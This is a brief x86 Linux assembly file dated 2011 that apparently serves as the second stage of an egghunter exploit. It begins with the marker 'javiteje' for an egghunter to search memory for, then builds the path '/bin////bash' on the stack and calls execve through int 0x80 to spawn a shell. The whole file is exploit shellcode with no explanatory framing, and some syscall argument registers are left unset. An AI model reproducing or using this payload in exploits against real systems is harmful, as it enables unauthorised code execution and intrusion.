;open a shell with "egg"
;author: Javier Tejedor
;date: 09/09/2011


global _start

section .text

_start:
	
	db "javiteje"		;egg which will be searched by the egghunter shellcode
	xor eax, eax
	push eax

	push 0x68736162
	push 0x2f2f2f2f
	push 0x6e69622f
	mov ebx, esp

	push eax

	mov al, 11
	int 0x80
